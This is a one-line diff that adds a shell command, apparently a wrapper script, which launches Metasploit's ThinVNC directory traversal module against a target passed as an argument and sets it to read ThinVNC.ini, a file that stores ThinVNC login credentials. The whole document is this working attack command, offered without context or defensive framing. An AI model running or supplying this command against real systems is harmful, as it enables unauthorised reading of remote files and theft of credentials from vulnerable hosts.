@@ -1,0 +1,1 @@
+msfconsole -q -x "use auxiliary/scanner/http/thinvnc_traversal;set FILEPATH ThinVNC.ini;set RHOSTS $1;run;exit"
